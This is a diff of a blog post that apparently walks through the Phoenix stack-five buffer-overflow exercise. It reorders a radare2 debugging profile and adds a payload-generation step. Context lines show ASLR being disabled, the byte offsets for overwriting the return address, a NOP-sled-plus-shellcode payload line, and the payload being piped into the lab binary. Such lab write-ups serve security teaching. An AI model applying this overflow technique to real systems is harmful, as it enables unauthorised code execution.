@@ -127,14 +127,6 @@ Something noteworthy is that in the case of using the deb package, instead of th
 $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 {% endhighlight %}
 
-{% highlight shell %}
-#!/usr/bin/env rarun2
-stdio=/dev/pts/0
-stdin=./pattern
-{% endhighlight %}
-
-*Replace `/dev/pts/0` with the output of the command `tty` and `./pattern` with the full path to the file that contains the input to be read from the binary.*
-
 To overwrite the return address, the input needs to have 136 bytes to fill the buffer, 4 more bytes to override the previous stack frame's pointer and, lastly, 4 more bytes to overwrite the return address.
 
 {% highlight python %}
@@ -151,6 +143,17 @@ os.write(1, nop_sled + shellcode + nop_padding + return_address + b'\n')
 
 {% highlight shell %}
 $ ./theScript.py > pattern
+{% endhighlight %}
+
+{% highlight shell %}
+#!/usr/bin/env rarun2
+stdio=/dev/pts/0
+stdin=./pattern
+{% endhighlight %}
+
+*Replace `/dev/pts/0` with the output of the command `tty` and `./pattern` with the full path to the file that contains the input to be read from the binary.*
+
+{% highlight shell %}
 $ r2 -d /opt/phoenix/i486/stack-five -r theProfile.rr2
 {% endhighlight %}
 
@@ -233,6 +236,7 @@ os.write(1, nop_sled + shellcode + nop_padding + return_address + b'\n')
 {% endhighlight %}
 
 {% highlight shell %}
+$ ./theScript.py > pattern
 $ cat pattern - | /opt/phoenix/i486/stack-five
 Welcome to phoenix/stack-five, brought to you by https://exploit.education
 whoami
